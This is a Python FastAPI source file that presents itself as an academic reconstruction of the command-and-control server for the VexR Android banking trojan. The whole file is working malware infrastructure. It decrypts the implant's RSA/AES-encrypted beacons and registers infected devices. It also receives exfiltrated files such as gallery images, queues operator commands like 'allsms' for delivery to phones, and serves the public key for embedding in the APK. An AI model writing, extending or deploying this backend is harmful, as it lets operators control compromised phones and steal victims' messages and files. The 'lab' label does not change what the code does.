"""
VexR C2 Backend — Academic Lab Reconstruction
==============================================

Reconstructed from static analysis of D_Kyt7.apk (com.VexR.app v1.1).
Implements the exact uplink protocol used by the sample:

  Client (APK)                          Server (this)
  ─────────────────────────────────────────────────────────────────────
  AES-256 key + 16-byte IV generated
  d = Base64( AES/CBC/PKCS5(data) )  ──►  RSA-decrypt k -> AES key
  k = Base64( RSA(aes_key) )         ──►  AES-decrypt d    -> payload
  i = Base64( IV )                   ──►  store + respond
                                          pending_commands <── pull channel

Original crypto (decompiled, a/wg1.java):
  - RSA/ECB/PKCS1Padding for key transport (X.509 SubjectPublicKeyInfo)
  - AES/CBC/PKCS5Padding for payload, per-message random key + IV
  - envelope: v=3&d=...&k=...&i=...

Run:  uvicorn server:app --host 0.0.0.0 --port 8000
"""

from __future__ import annotations

import base64
import json
import os
import sqlite3
import time
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from fastapi import FastAPI, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "vexr_lab.db"
PRIVATE_KEY_PATH = BASE_DIR / "server_private.pem"
PUBLIC_KEY_PATH = BASE_DIR / "server_public.pem"

# Auth token hardcoded in the sample (decoded from InternalResolver.AUTH_BYTES).
# Overridden for the academic lab build — see README.md.
AUTH_TOKEN = "VexR_Lab_Academic_Token_2026"
SUDO_PORT = "EeILBT"  # from assets/sudoport.txt

# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------

SCHEMA = """
CREATE TABLE IF NOT EXISTS devices (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT UNIQUE NOT NULL,
    model         TEXT,
    android_ver   TEXT,
    first_seen    TEXT NOT NULL,
    last_seen     TEXT NOT NULL,
    beacon_count  INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS beacons (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    action        TEXT,
    payload       TEXT,
    received_at   TEXT NOT NULL,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS files (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    filename      TEXT,
    size_bytes    INTEGER,
    received_at   TEXT NOT NULL,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS commands (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    command       TEXT NOT NULL,
    params        TEXT,
    status        TEXT NOT NULL DEFAULT 'pending',
    created_at    TEXT NOT NULL,
    sent_at       TEXT,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS log (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    ts            TEXT NOT NULL,
    level         TEXT NOT NULL,
    message       TEXT NOT NULL
);
"""


@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


def init_db() -> None:
    with db() as conn:
        conn.executescript(SCHEMA)


def log(level: str, message: str) -> None:
    with db() as conn:
        conn.execute(
            "INSERT INTO log (ts, level, message) VALUES (?, ?, ?)",
            (datetime.now(timezone.utc).isoformat(), level, message),
        )


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Crypto — mirrors a/wg1.java exactly
# ---------------------------------------------------------------------------


class ProtocolCrypto:
    """Server-side counterpart of the implant's crypto."""

    def __init__(self) -> None:
        self._private_key = serialization.load_pem_private_key(
            PRIVATE_KEY_PATH.read_bytes(), password=None
        )
        self.public_key_b64 = base64.b64encode(
            self._private_key.public_key().public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        ).decode()

    def decrypt(self, envelope: dict[str, str]) -> dict[str, Any]:
        """Decrypt a v=3&d=&k=&i= envelope into the original payload dict."""
        encrypted_key = base64.b64decode(envelope["k"])
        encrypted_data = base64.b64decode(envelope["d"])
        iv = base64.b64decode(envelope["i"])

        # 1. RSA/ECB/PKCS1 -> recover the per-message AES-256 key
        aes_key = self._private_key.decrypt(
            encrypted_key,
            padding.PKCS1v15(),
        )

        # 2. AES/CBC/PKCS5 -> recover the payload
        decryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).decryptor()
        padded = decryptor.update(encrypted_data) + decryptor.finalize()
        plaintext = _pkcs5_unpad(padded)

        return json.loads(plaintext.decode("utf-8"))

    def encrypt(self, payload: dict[str, Any]) -> dict[str, str]:
        """Encrypt a response payload using the same envelope (for testing)."""
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        plaintext = json.dumps(payload).encode()

        encryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).encryptor()
        padded = _pkcs5_pad(plaintext)
        encrypted = encryptor.update(padded) + encryptor.finalize()

        enc_key = self._private_key.public_key().encrypt(aes_key, padding.PKCS1v15())

        return {
            "v": "3",
            "d": base64.b64encode(encrypted).decode(),
            "k": base64.b64encode(enc_key).decode(),
            "i": base64.b64encode(iv).decode(),
        }


def _pkcs5_pad(data: bytes, block: int = 16) -> bytes:
    padlen = block - (len(data) % block)
    return data + bytes([padlen]) * padlen


def _pkcs5_unpad(data: bytes) -> bytes:
    if not data:
        return data
    padlen = data[-1]
    if padlen < 1 or padlen > 16 or padlen > len(data):
        return data
    return data[:-padlen]


crypto = ProtocolCrypto()

# ---------------------------------------------------------------------------
# Device registry
# ---------------------------------------------------------------------------


def register_device(payload: dict[str, Any]) -> str:
    """Upsert a device from its beacon payload; returns the device key."""
    device_key = payload.get("device_id") or payload.get("imei") or "unknown"
    model = payload.get("model") or payload.get("device_model")
    android_ver = payload.get("android_version") or payload.get("sdk")

    with db() as conn:
        row = conn.execute(
            "SELECT id FROM devices WHERE device_key = ?", (device_key,)
        ).fetchone()
        if row is None:
            conn.execute(
                "INSERT INTO devices (device_key, model, android_ver, first_seen, last_seen, beacon_count)"
                " VALUES (?, ?, ?, ?, ?, 1)",
                (device_key, model, android_ver, utcnow(), utcnow()),
            )
        else:
            conn.execute(
                "UPDATE devices SET last_seen = ?, beacon_count = beacon_count + 1,"
                " model = COALESCE(?, model), android_ver = COALESCE(?, android_ver)"
                " WHERE device_key = ?",
                (utcnow(), model, android_ver, device_key),
            )
    return device_key


def queue_pending_commands(device_key: str) -> list[str]:
    """Return and mark-sent all queued commands for a device."""
    with db() as conn:
        rows = conn.execute(
            "SELECT id, command, params FROM commands"
            " WHERE device_key = ? AND status = 'pending'",
            (device_key,),
        ).fetchall()
        for row in rows:
            conn.execute(
                "UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?",
                (utcnow(), row["id"]),
            )
    return [row["command"] for row in rows]


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="VexR Lab C2",
    description="Academic reconstruction of the VexR banking-trojan C2 protocol",
    version="1.0.0",
)


@app.on_event("startup")
def _startup() -> None:
    init_db()
    log("info", "C2 backend started")


def _authorized(request: Request) -> bool:
    return request.headers.get("X-Auth-Token") == AUTH_TOKEN


def _parse_form(body: str) -> dict[str, str]:
    from urllib.parse import parse_qsl

    return dict(parse_qsl(body))


@app.post("/panel.php")
async def panel(request: Request, p: str = Query(default=""), action: str = Query(default="")):
    """Primary uplink endpoint — receives encrypted beacons."""
    if not _authorized(request):
        log("warn", f"unauthorized beacon rejected from {request.client.host}")
        return JSONResponse({"status": "forbidden"}, status_code=403)

    raw = (await request.body()).decode("utf-8", "replace")
    form = _parse_form(raw)

    try:
        payload = crypto.decrypt(form)
    except Exception as exc:  # noqa: BLE001 - log everything, never crash the C2
        log("error", f"decrypt failed: {exc}")
        return JSONResponse({"status": "error", "reason": "decrypt_failed"}, status_code=400)

    device_key = register_device(payload)

    with db() as conn:
        conn.execute(
            "INSERT INTO beacons (device_key, action, payload, received_at) VALUES (?, ?, ?, ?)",
            (device_key, action or payload.get("action"), json.dumps(payload), utcnow()),
        )

    pending = queue_pending_commands(device_key)
    log("info", f"beacon action={action or payload.get('action')} device={device_key}")

    resp: dict[str, Any] = {"status": "ok"}
    if pending:
        resp["pending_commands"] = pending
    return JSONResponse(resp)


@app.post("/file.php")
async def file_upload(request: Request, p: str = Query(default="")):
    """File exfil endpoint (gallery images etc.)."""
    if not _authorized(request):
        return JSONResponse({"status": "forbidden"}, status_code=403)

    raw = (await request.body()).decode("utf-8", "replace")
    form = _parse_form(raw)

    try:
        payload = crypto.decrypt(form)
    except Exception as exc:  # noqa: BLE001
        log("error", f"file decrypt failed: {exc}")
        return JSONResponse({"status": "error"}, status_code=400)

    device_key = register_device(payload)
    filename = payload.get("filename") or payload.get("name") or "unknown"
    size = payload.get("size") or len(json.dumps(payload))

    with db() as conn:
        conn.execute(
            "INSERT INTO files (device_key, filename, size_bytes, received_at) VALUES (?, ?, ?, ?)",
            (device_key, filename, size, utcnow()),
        )
    log("info", f"file received device={device_key} name={filename} size={size}")
    return JSONResponse({"status": "ok"})


# --- Operator API ----------------------------------------------------------


class CommandIn(BaseModel):
    device_key: str
    command: str
    params: Optional[str] = None


@app.post("/api/command")
def api_queue_command(cmd: CommandIn):
    """Operator queues a command for a device (delivered on next beacon)."""
    with db() as conn:
        conn.execute(
            "INSERT INTO commands (device_key, command, params, created_at)"
            " VALUES (?, ?, ?, ?)",
            (cmd.device_key, cmd.command, cmd.params, utcnow()),
        )
    log("info", f"command queued device={cmd.device_key} cmd={cmd.command}")
    return {"status": "queued", "command": cmd.command}


@app.get("/api/devices")
def api_devices():
    with db() as conn:
        devices = [dict(r) for r in conn.execute("SELECT * FROM devices ORDER BY last_seen DESC")]
        for d in devices:
            d["beacons"] = conn.execute(
                "SELECT COUNT(*) AS c FROM beacons WHERE device_key = ?", (d["device_key"],)
            ).fetchone()["c"]
            d["files"] = conn.execute(
                "SELECT COUNT(*) AS c FROM files WHERE device_key = ?", (d["device_key"],)
            ).fetchone()["c"]
            # beacons may arrive before the device row is enriched; fall back to
            # the android_version recorded on the newest beacon
            if not d["android_ver"]:
                row = conn.execute(
                    "SELECT payload FROM beacons WHERE device_key = ? ORDER BY id DESC LIMIT 1",
                    (d["device_key"],),
                ).fetchone()
                if row:
                    try:
                        d["android_ver"] = json.loads(row["payload"]).get("android_version")
                    except Exception:  # noqa: BLE001
                        pass
    return {"devices": devices}


@app.get("/api/beacons")
def api_beacons(limit: int = 100):
    with db() as conn:
        rows = [dict(r) for r in conn.execute(
            "SELECT * FROM beacons ORDER BY id DESC LIMIT ?", (limit,)
        )]
    return {"beacons": rows}


@app.get("/api/log")
def api_log(limit: int = 100):
    with db() as conn:
        rows = [dict(r) for r in conn.execute(
            "SELECT * FROM log ORDER BY id DESC LIMIT ?", (limit,)
        )]
    return {"log": rows}


@app.get("/api/publickey")
def api_publickey():
    """The Base64 X.509 public key to embed in the APK."""
    return {"public_key": crypto.public_key_b64}


# --- Dashboard -------------------------------------------------------------

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VexR Lab C2 — Academic Dashboard</title>
<style>
  :root { --bg:#0b0f14; --card:#151b23; --line:#232c38; --fg:#e6edf3; --dim:#8b949e;
          --ok:#3fb950; --warn:#d29922; --err:#f85149; --accent:#58a6ff; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg);
         font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace; padding:20px; }
  h1 { font-size:18px; margin:0 0 4px; }
  .sub { color:var(--dim); font-size:12px; margin-bottom:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:16px; }
  .card { background:var(--card); border:1px solid var(--line); border-radius:10px; padding:14px; }
  .card h2 { font-size:13px; text-transform:uppercase; letter-spacing:.08em;
             color:var(--dim); margin:0 0 10px; }
  table { width:100%; border-collapse:collapse; font-size:12px; }
  th,td { text-align:left; padding:6px 8px; border-bottom:1px solid var(--line); }
  th { color:var(--dim); font-weight:500; }
  .pill { display:inline-block; padding:1px 8px; border-radius:20px; font-size:11px; }
  .pill.ok { background:rgba(63,185,80,.15); color:var(--ok); }
  .pill.warn { background:rgba(210,153,34,.15); color:var(--warn); }
  .pill.err { background:rgba(248,81,73,.15); color:var(--err); }
  .pill.info { background:rgba(88,166,255,.15); color:var(--accent); }
  .stat { font-size:26px; font-weight:600; }
  .stat-label { color:var(--dim); font-size:11px; text-transform:uppercase; }
  .stats { display:flex; gap:24px; flex-wrap:wrap; }
  pre { background:#0d1117; border:1px solid var(--line); border-radius:6px; padding:8px;
        overflow:auto; max-height:260px; font-size:11px; }
  button { background:var(--accent); color:#04121f; border:0; border-radius:6px;
           padding:6px 12px; font:inherit; font-size:12px; cursor:pointer; }
  input,select { background:#0d1117; border:1px solid var(--line); color:var(--fg);
                 border-radius:6px; padding:6px 8px; font:inherit; font-size:12px; width:100%; }
  .row { display:flex; gap:8px; margin-bottom:8px; }
  .empty { color:var(--dim); font-size:12px; font-style:italic; }
</style>
</head>
<body>
<h1>VexR Lab C2 <span class="pill info">ACADEMIC</span></h1>
<div class="sub">Reconstructed protocol · isolated lab environment · educational use only</div>

<div class="grid">
  <div class="card">
    <h2>Overview</h2>
    <div class="stats">
      <div><div class="stat" id="s-devices">–</div><div class="stat-label">Devices</div></div>
      <div><div class="stat" id="s-beacons">–</div><div class="stat-label">Beacons</div></div>
      <div><div class="stat" id="s-files">–</div><div class="stat-label">Files</div></div>
    </div>
  </div>

  <div class="card">
    <h2>Queue command</h2>
    <div class="row"><input id="c-device" placeholder="device_key"></div>
    <div class="row"><input id="c-cmd" placeholder="command (e.g. allsms)"></div>
    <div class="row"><input id="c-params" placeholder="params (optional JSON)"></div>
    <button onclick="sendCmd()">Queue</button>
    <div class="sub" id="c-status" style="margin:8px 0 0"></div>
  </div>
</div>

<div class="grid" style="margin-top:16px">
  <div class="card">
    <h2>Devices</h2>
    <div id="devices"><div class="empty">waiting for first beacon…</div></div>
  </div>

  <div class="card">
    <h2>Recent beacons</h2>
    <div id="beacons"><div class="empty">no data</div></div>
  </div>
</div>

<div class="card" style="margin-top:16px">
  <h2>Server log</h2>
  <pre id="log"></pre>
</div>

<script>
async function refresh() {
  const [dev, bec, lg] = await Promise.all([
    fetch('/api/devices').then(r => r.json()),
    fetch('/api/beacons?limit=25').then(r => r.json()),
    fetch('/api/log?limit=40').then(r => r.json()),
  ]);

  document.getElementById('s-devices').textContent = dev.devices.length;
  document.getElementById('s-beacons').textContent = dev.devices.reduce((a,d) => a + d.beacons, 0);
  document.getElementById('s-files').textContent = dev.devices.reduce((a,d) => a + d.files, 0);

  document.getElementById('devices').innerHTML = dev.devices.length
    ? `<table><tr><th>Device</th><th>Model</th><th>Android</th><th>Beacons</th><th>Last seen</th></tr>` +
      dev.devices.map(d => `<tr><td>${d.device_key}</td><td>${d.model ?? '-'}</td>` +
      `<td>${d.android_ver ?? '-'}</td><td>${d.beacons}</td><td>${d.last_seen}</td></tr>`).join('') + '</table>'
    : '<div class="empty">waiting for first beacon…</div>';

  document.getElementById('beacons').innerHTML = bec.beacons.length
    ? `<table><tr><th>#</th><th>Device</th><th>Action</th><th>Payload</th></tr>` +
      bec.beacons.map(b => `<tr><td>${b.id}</td><td>${b.device_key}</td><td>${b.action ?? '-'}</td>` +
      `<td><pre>${esc(b.payload)}</pre></td></tr>`).join('') + '</table>'
    : '<div class="empty">no data</div>';

  document.getElementById('log').textContent =
    lg.log.reverse().map(l => `[${l.ts}] ${l.level.toUpperCase()} ${l.message}`).join('\\n');
}

function esc(s) { const d = document.createElement('div'); d.textContent = s ?? ''; return d.innerHTML; }

async function sendCmd() {
  const body = {
    device_key: document.getElementById('c-device').value,
    command: document.getElementById('c-cmd').value,
    params: document.getElementById('c-params').value || null,
  };
  const r = await fetch('/api/command', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body),
  });
  const j = await r.json();
  document.getElementById('c-status').textContent = JSON.stringify(j);
  refresh();
}

refresh();
setInterval(refresh, 5000);
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
def dashboard():
    return DASHBOARD_HTML


@app.get("/health")
def health():
    return {"status": "ok", "time": utcnow(), "sudo_port": SUDO_PORT}
